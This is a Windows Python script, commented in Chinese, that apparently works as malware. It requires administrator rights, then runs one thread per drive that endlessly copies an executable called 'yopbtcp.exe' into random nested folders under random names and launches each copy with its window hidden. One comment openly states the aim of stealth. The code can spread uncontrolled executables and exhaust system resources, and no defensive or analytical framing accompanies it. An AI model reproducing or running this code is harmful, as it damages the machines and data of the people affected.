import os
import random
import shutil
import string
import subprocess
import sys
import threading
import time
import ctypes

def get_available_drives():
    """获取所有可用盘符"""
    drives = []
    for drive in string.ascii_uppercase:
        path = f"{drive}:\\"
        if os.path.exists(path):
            drives.append(path)
    return drives

class DriveThread(threading.Thread):
    def __init__(self, drive):
        super().__init__()
        self.drive = drive
        self.daemon = True  # 设置为守护线程

    def select_random_directory(self, max_depth=5):
        """随机目录选择逻辑"""
        current_dir = self.drive
        for _ in range(max_depth):
            try:
                entries = os.listdir(current_dir)
            except (PermissionError, FileNotFoundError):
                break
            dirs = [e for e in entries if os.path.isdir(os.path.join(current_dir, e))]
            if not dirs:
                break
            chosen_dir = random.choice(dirs)
            current_dir = os.path.join(current_dir, chosen_dir)
        return current_dir

    def generate_random_filename(self, length=8):
        """生成随机文件名"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choices(chars, k=length)) + '.exe'

    def run(self):
        """线程主逻辑"""
        exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'yopbtcp.exe')
        
        while True:
            try:
                target_dir = self.select_random_directory()
                new_name = self.generate_random_filename()
                dest_path = os.path.join(target_dir, new_name)
                
                # 文件复制
                shutil.copy(exe_path, dest_path)
                
                # 静默运行
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                subprocess.Popen(
                    dest_path,
                    startupinfo=startupinfo,
                    shell=True
                )
                
                print(f"[+][{self.drive}] 成功部署到：{dest_path}")
                
            except Exception as e:
                print(f"[{self.drive}] 操作失败：{str(e)}")
            
            # time.sleep(random.randint(0, 10))  # 随机间隔增加隐蔽性

def main():
    # 检查管理员权限
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("请以管理员身份运行！")
        sys.exit(1)

    # 获取所有可用盘符
    drives = get_available_drives()
    
    if not drives:
        print("未找到可用磁盘！")
        return

    # 为每个盘符创建线程
    threads = []
    for drive in drives:
        thread = DriveThread(drive)
        thread.start()
        threads.append(thread)
        print(f"已启动 {drive} 盘处理线程")

    # 保持主线程存活
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n程序终止")

if __name__ == "__main__":
    main()
